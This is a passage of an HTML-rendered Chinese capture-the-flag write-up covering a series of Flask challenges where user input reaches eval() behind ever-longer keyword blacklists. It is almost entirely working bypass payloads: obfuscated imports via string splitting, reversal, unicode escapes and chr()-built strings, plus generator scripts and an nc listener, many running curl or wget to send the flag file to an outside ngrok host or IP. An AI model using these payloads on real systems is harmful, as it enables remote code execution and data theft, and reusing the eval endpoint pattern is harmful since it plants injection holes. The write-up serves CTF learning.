class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|popen|system&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><h1 id="web428"><a href="#web428" class="headerlink" title="web428"></a>web428</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|popen|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><h1 id="web429"><a href="#web429" class="headerlink" title="web429"></a>web429</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|open|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code= <span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><p>匹配有问题,前面加个空格</p><h1 id="web430"><a href="#web430" class="headerlink" title="web430"></a>web430</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|open|system|read|eval&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code= <span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><h1 id="web431"><a href="#web431" class="headerlink" title="web431"></a>web431</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|open|system|read|eval|str&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code= <span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure><h1 id="web432"><a href="#web432" class="headerlink" title="web432"></a>web432</h1><p>过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">80</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(__builtins__.__dict__[<span class="string">&#x27;__impo&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;rt__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;s&#x27;</span>).<span class="title function_ invoke__">__getattribute__</span>(<span class="string">&#x27;syste&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;m&#x27;</span>)(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">185</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;curl http://xx.xx.xx.xx?1=`cat /flag`&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="web433"><a href="#web433" class="headerlink" title="web433"></a>web433</h1><p>过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span>|builtins</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).<span class="title function_ invoke__">__getattribute__</span>(<span class="string">&#x27;syste&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;m&#x27;</span>)(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">185</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span><span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;curl http://xx.xx.xx.xx?1=`cat /flag`&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="web434"><a href="#web434" class="headerlink" title="web434"></a>web434</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span>|builtins|curl</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).<span class="title function_ invoke__">__getattribute__</span>(<span class="string">&#x27;syste&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;m&#x27;</span>)(<span class="string">&#x27;cu&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;rl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">185</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span><span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;wget http://xx.xx.xx.xx?1=`cat /fl*`&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="web435"><a href="#web435" class="headerlink" title="web435"></a>web435</h1><p>过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;import o\x73;o\x73.\x73ystem(\&quot;\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0034\\u0032\\u002e\\u0031\\u0039\\u0032\\u002e\\u0031\\u0033\\u0037\\u002e\\u0032\\u0031\\u0032\\u003f\\u0031\\u003d\\u0060\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0060\&quot;)&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#123;11:c&#125;&#123;12:c&#125;&#123;13:c&#125;&#123;14:c&#125;&#123;15:c&#125;&#123;16:c&#125;&#123;17:c&#125;&#123;18:c&#125;&#123;19:c&#125;&#123;20:c&#125;&#123;21:c&#125;&#123;22:c&#125;&#123;23:c&#125;&#123;24:c&#125;&#123;25:c&#125;&#123;26:c&#125;&#123;27:c&#125;&#123;28:c&#125;&#123;29:c&#125;&#123;30:c&#125;&#123;31:c&#125;&#123;32:c&#125;&#123;33:c&#125;&#123;34:c&#125;&#123;35:c&#125;&#123;36:c&#125;&#123;37:c&#125;&#123;38:c&#125;&#123;39:c&#125;&#123;40:c&#125;&#123;41:c&#125;&#123;42:c&#125;&#123;43:c&#125;&#123;44:c&#125;&#123;45:c&#125;&#123;46:c&#125;&#123;47:c&#125;&#123;48:c&#125;&#123;49:c&#125;&#123;50:c&#125;&#123;51:c&#125;&#123;52:c&#125;&#123;53:c&#125;&#123;54:c&#125;&#123;55:c&#125;&#123;56:c&#125;&#123;57:c&#125;&#123;58:c&#125;&#123;59:c&#125;&#123;60:c&#125;&#123;61:c&#125;&#123;62:c&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">59</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">32</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">46</span>,<span class="number">50</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">63</span>,<span class="number">49</span>,<span class="number">61</span>,<span class="number">96</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">96</span>,<span class="number">34</span>,<span class="number">41</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;import os;os.system(&quot;curl http://b423-111-17-194-91.ngrok.io:80?1=`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">    res += (<span class="string">&quot;&#123;&quot;</span>+f<span class="string">&quot;&#123;j&#125;:c&quot;</span>+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">res += <span class="string">&#x27;&quot;.format(&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">    res += f<span class="string">&#x27;&#123;ord(i)&#125;,&#x27;</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">res = res[:-<span class="number">1</span>]</span><br><span class="line">res = res+<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">print</span>(res)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">eval</span>(res))</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;)&quot;`*f/ tac`=p?08:oi.korgn.19-491-71-111-324b//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><h1 id="web436-439"><a href="#web436-439" class="headerlink" title="web436-439"></a>web436-439</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">436</span>过滤了os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr</span><br><span class="line"></span><br><span class="line"><span class="number">437</span>过滤了os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr</span><br><span class="line"></span><br><span class="line"><span class="number">438</span>过滤了os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr|&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">439</span>过滤了os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr|&#123;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;)&quot;`*f/ tac`=p?08:oi.korgn.19-491-71-111-324b//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><h1 id="web440"><a href="#web440" class="headerlink" title="web440"></a>web440</h1><p>过滤了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr|&#123;|<span class="string">&#x27;|&quot;</span></span><br></pre></td></tr></table></figure><p>没有了引号，我们可以用chr构造字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;)&quot;</span></span><br><span class="line">def <span class="title function_ invoke__">ccchr</span>(s):</span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(s)):</span><br><span class="line"><span class="keyword">if</span> i&lt;<span class="title function_ invoke__">len</span>(s)-<span class="number">1</span>:</span><br><span class="line">t+=<span class="string">&#x27;chr(&#x27;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">ord</span>(s[i]))+<span class="string">&#x27;)%2b&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">t+=<span class="string">&#x27;chr(&#x27;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">ord</span>(s[i]))+<span class="string">&#x27;)&#x27;</span></span><br><span class="line"><span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;?code=str(exec(&#x27;</span>+<span class="title function_ invoke__">ccchr</span>(s)+<span class="string">&#x27;))&#x27;</span>)</span><br><span class="line"><span class="comment">#?code=str(exec(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(115)%2bchr(121)%2bchr(115)%2bchr(116)%2bchr(101)%2bchr(109)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(117)%2bchr(114)%2bchr(108)%2bchr(32)%2bchr(104)%2bchr(116)%2bchr(116)%2bchr(112)%2bchr(58)%2bchr(47)%2bchr(47)%2bchr(98)%2bchr(52)%2bchr(50)%2bchr(51)%2bchr(45)%2bchr(49)%2bchr(49)%2bchr(49)%2bchr(45)%2bchr(49)%2bchr(55)%2bchr(45)%2bchr(49)%2bchr(57)%2bchr(52)%2bchr(45)%2bchr(57)%2bchr(49)%2bchr(46)%2bchr(110)%2bchr(103)%2bchr(114)%2bchr(111)%2bchr(107)%2bchr(46)%2bchr(105)%2bchr(111)%2bchr(58)%2bchr(56)%2bchr(48)%2bchr(63)%2bchr(112)%2bchr(61)%2bchr(96)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(42)%2bchr(96)%2bchr(39)%2bchr(41)))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web441"><a href="#web441" class="headerlink" title="web441"></a>web441</h1><p>在上面的方法上用request进行了优化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(request.args.<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">chr</span>(<span class="number">97</span>))))&amp;a=<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">str</span>().<span class="title function_ invoke__">join</span>([<span class="title function_ invoke__">chr</span>(<span class="number">105</span>),<span class="title function_ invoke__">chr</span>(<span class="number">109</span>),<span class="title function_ invoke__">chr</span>(<span class="number">112</span>),<span class="title function_ invoke__">chr</span>(<span class="number">111</span>),<span class="title function_ invoke__">chr</span>(<span class="number">114</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">32</span>),<span class="title function_ invoke__">chr</span>(<span class="number">111</span>),<span class="title function_ invoke__">chr</span>(<span class="number">115</span>),<span class="title function_ invoke__">chr</span>(<span class="number">59</span>),<span class="title function_ invoke__">chr</span>(<span class="number">111</span>),<span class="title function_ invoke__">chr</span>(<span class="number">115</span>),<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">115</span>),<span class="title function_ invoke__">chr</span>(<span class="number">121</span>),<span class="title function_ invoke__">chr</span>(<span class="number">115</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">101</span>),<span class="title function_ invoke__">chr</span>(<span class="number">109</span>),<span class="title function_ invoke__">chr</span>(<span class="number">40</span>),<span class="title function_ invoke__">chr</span>(<span class="number">34</span>),<span class="title function_ invoke__">chr</span>(<span class="number">99</span>),<span class="title function_ invoke__">chr</span>(<span class="number">117</span>),<span class="title function_ invoke__">chr</span>(<span class="number">114</span>),<span class="title function_ invoke__">chr</span>(<span class="number">108</span>),<span class="title function_ invoke__">chr</span>(<span class="number">32</span>),<span class="title function_ invoke__">chr</span>(<span class="number">104</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">112</span>),<span class="title function_ invoke__">chr</span>(<span class="number">58</span>),<span class="title function_ invoke__">chr</span>(<span class="number">47</span>),<span class="title function_ invoke__">chr</span>(<span class="number">47</span>),<span class="title function_ invoke__">chr</span>(<span class="number">52</span>),<span class="title function_ invoke__">chr</span>(<span class="number">50</span>),<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),<span class="title function_ invoke__">chr</span>(<span class="number">57</span>),<span class="title function_ invoke__">chr</span>(<span class="number">50</span>),<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),<span class="title function_ invoke__">chr</span>(<span class="number">51</span>),<span class="title function_ invoke__">chr</span>(<span class="number">55</span>),<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">50</span>),<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),<span class="title function_ invoke__">chr</span>(<span class="number">50</span>),<span class="title function_ invoke__">chr</span>(<span class="number">63</span>),<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),<span class="title function_ invoke__">chr</span>(<span class="number">61</span>),<span class="title function_ invoke__">chr</span>(<span class="number">96</span>),<span class="title function_ invoke__">chr</span>(<span class="number">99</span>),<span class="title function_ invoke__">chr</span>(<span class="number">97</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">32</span>),<span class="title function_ invoke__">chr</span>(<span class="number">47</span>),<span class="title function_ invoke__">chr</span>(<span class="number">102</span>),<span class="title function_ invoke__">chr</span>(<span class="number">108</span>),<span class="title function_ invoke__">chr</span>(<span class="number">97</span>),<span class="title function_ invoke__">chr</span>(<span class="number">103</span>),<span class="title function_ invoke__">chr</span>(<span class="number">96</span>),<span class="title function_ invoke__">chr</span>(<span class="number">34</span>),<span class="title function_ invoke__">chr</span>(<span class="number">41</span>)])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web442"><a href="#web442" class="headerlink" title="web442"></a>web442</h1><p>过滤了数字</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(request.args.<span class="title function_ invoke__">get</span>(request.method)))&amp;GET=<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(request.args.<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">str</span>(None)))&amp;None=import os;os.<span class="title function_ invoke__">system</span>(<span class="string">&quot;curl http://xx.xx.xx.xx?1=`cat /flag`&quot;</span>)</span><br><span class="line">当然可以构造数字hh</span><br><span class="line"><span class="keyword">print</span>((<span class="title function_ invoke__">len</span>(<span class="title function_ invoke__">str</span>(None))*<span class="title function_ invoke__">len</span>(<span class="title function_ invoke__">str</span>(None))*<span class="title function_ invoke__">len</span>(<span class="title function_ invoke__">str</span>(None))+<span class="title function_ invoke__">len</span>(<span class="title function_ invoke__">str</span>(None))))</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">chr</span>(<span class="number">68</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web443"><a href="#web443" class="headerlink" title="web443"></a>web443</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">def <span class="title function_ invoke__">getNumber3</span>(number):</span><br><span class="line">    number = <span class="keyword">int</span>(number)</span><br><span class="line">    <span class="keyword">if</span> number in [-<span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~int((len(str(None))/len(str(None))))&quot;</span>, <span class="string">&quot;~int(len(str()))&quot;</span>,</span><br><span class="line">                <span class="string">&quot;int(len(str()))&quot;</span>, <span class="string">&quot;int((len(str(None))/len(str(None))))&quot;</span>][number + <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~%s&quot;</span> % <span class="title function_ invoke__">getNumber3</span>(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(%s&lt;&lt;(int((len(str(None))/len(str(None))))))&quot;</span> % <span class="title function_ invoke__">getNumber3</span>(number / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;import os;os.system(&quot;curl http://b423-111-17-194-91.ngrok.io:80?1=`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;str().join([&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">    res += f<span class="string">&quot;chr(&#123;getNumber3(ord(i))&#125;),&quot;</span></span><br><span class="line">res = res[:-<span class="number">1</span>]</span><br><span class="line">res += <span class="string">&#x27;])&#x27;</span></span><br><span class="line"><span class="keyword">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight 